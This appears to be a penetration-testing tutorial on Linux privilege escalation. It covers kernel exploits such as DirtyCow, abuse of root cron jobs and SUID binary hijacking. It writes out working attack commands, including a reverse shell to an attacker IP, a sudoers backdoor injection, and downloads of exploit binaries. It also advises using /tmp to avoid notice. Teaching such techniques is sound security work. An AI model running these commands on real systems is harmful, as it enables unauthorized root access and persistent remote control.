# Linux Privilege Escalation

**Privilege escalation** is the process of exploiting vulnerabilities or misconfigurations to elevate access from a low-privileged user to `root`. It is a critical phase of the attack lifecycle and a major determinant of penetration test success.

> ⚠️ **Note**: All commands assume you have already gained **initial access** to the target Linux system as a low-privileged user. Replace paths and values with your actual ones.

---

## The Linux Kernel

The **kernel** is the core of the operating system — it has complete control over every resource and hardware component on the system. It acts as a translation layer between hardware and software.

Linux kernel exploits target vulnerabilities in the kernel itself to execute arbitrary code with the highest privilege level — `root`. The process differs based on:
- The **kernel version** and **distribution** being targeted.
- The specific **kernel exploit** being used.

> ⚠️ **Caution**: Kernel exploits can cause **system crashes and data loss**. Avoid in production/enterprise environments unless absolutely necessary.

---

## Privilege Escalation Methodology

```
Gain Initial Access → Enumerate System → Identify Vulnerabilities → Exploit → Root Shell
```

### Step 1: Enumerate the System

Once you have a low-privilege shell on the target:

```bash
# Kernel version and architecture
uname -a
uname -r

# Distribution and version
cat /etc/issue
cat /etc/*-release

# Current user and privileges
whoami
id
sudo -l
```

Note the **kernel version**, **architecture** (x86/x64), **distribution**, and **distribution version** — you will need all of these to find compatible exploits.

### Step 2: Check for Quick Wins First

Before resorting to kernel exploits, always check for simpler escalation paths:

```bash
# Check sudo permissions — can you run anything as root?
sudo -l

# Find SUID binaries owned by root
find / -user root -perm -4000 -type f 2>/dev/null

# Check writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

---

## 1. Kernel Exploitation with Linux-Exploit-Suggester

**Linux-Exploit-Suggester** assesses the exposure of the given kernel against every publicly known Linux kernel exploit. It identifies which exploits apply to the specific kernel version running on the target.

> GitHub: https://github.com/mzet-/linux-exploit-suggester

### Step 1: Transfer Linux-Exploit-Suggester to the Target

On Kali, host the script:

```bash
python3 -m http.server 80
```

On the target, download it:

```bash
wget http://<your_ip>/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
```

### Step 2: Run the Tool

```bash
/tmp/les.sh
```

The output lists applicable kernel exploits ranked by exposure. Note the **CVE codes** and exploit names — use these to find compiled exploit code.

### Step 3: Find and Compile the Exploit

Example using **DirtyCow (CVE-2016-5195)** — one of the most famous Linux kernel exploits, affecting kernels 2.6.22 through 4.8.3:

```bash
# On Kali — search for the exploit
searchsploit dirty cow

# Download the exploit source code
searchsploit -m 40616   # or the relevant exploit ID
```

Compile the exploit on Kali (or on the target if a compiler is available):

```bash
gcc -pthread dirty.c -o dirtycow -lcrypt
```

### Step 4: Transfer and Execute the Exploit

```bash
# Transfer compiled exploit to target
wget http://<your_ip>/dirtycow -O /tmp/dirtycow
chmod +x /tmp/dirtycow

# Execute
/tmp/dirtycow
```

> **Always upload exploit files to `/tmp`** — it is world-writable and less likely to be noticed.

> Linux kernel exploits by CVE: https://github.com/SecWiki/linux-kernel-exploits

---

## 2. Exploiting Misconfigured Cron Jobs

### What are Cron Jobs?

**Cron** is a time-based task scheduler in Linux. It runs scripts and commands automatically on a defined schedule. Each scheduled task is called a **Cron job**, and its configuration is stored in the **crontab** file.

**Why they matter for privilege escalation**: Cron jobs configured to run as `root` execute their scripts with root permissions. If a low-privileged user can **edit or replace** the script being called, they can inject malicious commands that run as root.

```
Root-owned Cron Job → Runs a Script → Script is World-Writable → Inject Commands → Root Shell
```

### Step 1: Identify Root Cron Jobs

```bash
# View the system-wide crontab
cat /etc/crontab

# Check cron directories for scheduled jobs
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# Search for references to specific files being executed
grep -rnw /usr -e "/home/<user>/filename"
```

### Step 2: Check Permissions on the Script

Once you find a script being called by a root cron job:

```bash
ls -al /usr/local/share/copy.sh
```

Look for **world-writable permissions** (`-rwxrwxrwx` or `-rwxrwxr-x` with group write). If any user can write to it, you can inject commands.

### Step 3: Inject a Privilege Escalation Command

**Method A — Add yourself to sudoers (no-password sudo)**:

```bash
printf '#!/bin/bash\necho "<your_user> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Wait for the cron job to execute (check the schedule in `/etc/crontab`), then:

```bash
sudo su
```

**Method B — Add a reverse shell**:

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<your_ip>/4444 0>&1' > /usr/local/share/copy.sh
```

Set up a listener on Kali:

```bash
nc -nlvp 4444
```

Wait for the cron job to trigger — you will receive a root shell.

### Step 4: Verify Root Access

```bash
whoami   # Should return: root
id
```

### Cron Job Privilege Escalation Summary

| Condition | Result |
|-----------|--------|
| Script called by root cron job is **world-writable** | Inject commands → executed as root |
| Script **does not exist** but path is in crontab | Create the script → executed as root |
| Script uses **relative paths** (no full path) | PATH hijacking possible |

---

## 3. Exploiting SUID Binaries

### What is SUID?

**SUID (Set User ID)** is a special Linux file permission. When set on an executable, it allows the program to run with the **permissions of the file owner** rather than the user who executes it.

In practice: if a binary is **owned by root** and has the **SUID bit set**, any user who executes it runs it with **root privileges** for the duration of that execution.

```
Low-priv User → Executes SUID Binary → Binary Runs as Root → Privilege Escalation
```

SUID is legitimate and necessary for many system binaries (e.g., `passwd` needs root to write `/etc/shadow`). The vulnerability arises when SUID binaries are **misconfigured** or **call external programs** insecurely.

### Step 1: Find All SUID Binaries Owned by Root

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Flag breakdown:
- `-user root` — owned by root
- `-perm -4000` — has SUID bit set
- `-type f` — regular files only
- `2>/dev/null` — suppress permission errors

### Step 2: Inspect the SUID Binary

Use `strings` to read human-readable content from the binary — this reveals what external programs or commands it calls:

```bash
strings /path/to/suid_binary
```

Look for calls to **external binaries without full paths** (e.g., `greetings` instead of `/usr/bin/greetings`) — these are exploitable via PATH hijacking.

### Step 3A: Replace the Called Binary (Direct Replacement)

If the SUID binary calls an external program (e.g., `greetings`) and you can control that file:

```bash
# Remove the original binary being called
rm /path/to/greetings

# Replace it with a copy of bash
cp /bin/bash /path/to/greetings
```

When the SUID binary executes, it will call your `bash` copy instead — running it as root.

```bash
# Execute the SUID binary
/path/to/welcome
# You now have a root shell
whoami   # root
```

### Step 3B: PATH Hijacking

If the SUID binary calls an external command by name only (no full path), you can hijack `$PATH` to make it run your malicious version:

```bash
# Create a malicious script named after the called binary
echo '/bin/bash' > /tmp/greetings
chmod +x /tmp/greetings

# Prepend /tmp to PATH so your version is found first
export PATH=/tmp:$PATH

# Execute the SUID binary — it finds your version first
/path/to/welcome
```

### Step 3C: Missing Shared Object Exploitation

If the SUID binary tries to load a **shared library (.so file)** that doesn't exist, you can create a malicious one:

```bash
# Find missing shared objects
strace /path/to/suid_binary 2>&1 | grep "No such file"

# Create a malicious shared object
gcc -shared -fPIC -o /path/to/missing.so exploit.c
```

### SUID Exploitation Methods Summary

| Method | When to Use | Command |
|--------|------------|---------|
| **Direct replacement** | Called binary path is writable | `cp /bin/bash /path/to/called_binary` |
| **PATH hijacking** | Binary calls programs without full path | `export PATH=/tmp:$PATH` |
| **Missing shared object** | Binary loads a non-existent `.so` file | Create malicious `.so` at expected path |

---

## Privilege Escalation Techniques Summary

| Technique | Tool/Method | Requirement | Result |
|-----------|------------|-------------|--------|
| **Kernel exploit** | Linux-Exploit-Suggester + exploit binary | Vulnerable kernel version | Root shell |
| **Cron job abuse** | Manual inspection + script injection | Writable script called by root cron | Root shell |
| **SUID binary** | `find` + `strings` + replacement | SUID binary with misconfiguration | Root shell |
| **Sudo misconfiguration** | `sudo -l` | Allowed sudo commands | Root shell |

---

## Key Takeaways

- **Privilege escalation** on Linux elevates access from a low-privileged user to `root`.
- Always **enumerate first**: `uname -a`, `id`, `sudo -l`, check SUID binaries, inspect crontab.
- **Check for simple paths before kernel exploits** — misconfigured sudo, SUID binaries, and writable cron scripts are far more common and stable.
- **Linux-Exploit-Suggester** identifies applicable kernel exploits for the specific version — transfer it to the target and run it there.
- **DirtyCow (CVE-2016-5195)** is one of the most well-known Linux kernel exploits — affects kernels 2.6.22 through 4.8.3.
- **Always upload exploit files to `/tmp`** — it is world-writable and less monitored.
- **Cron jobs** running as root with world-writable scripts are a critical misconfiguration — inject commands or a reverse shell into the script.
- Use `grep -rnw /usr -e "<script_path>"` to find which cron job calls a specific script.
- **SUID binaries** run with the owner's permissions — if owned by root and misconfigured, they grant root access.
- Use `find / -user root -perm -4000 -type f 2>/dev/null` to find all root-owned SUID binaries.
- Use `strings <binary>` to inspect what external programs a SUID binary calls — look for calls without full paths.
- **PATH hijacking** works when a SUID binary calls external commands without specifying the full path.
- **Direct replacement** works when the external binary called by SUID is in a writable location — replace it with `/bin/bash`.
- Kernel exploits are the **last resort** — unstable and risk crashing the system.
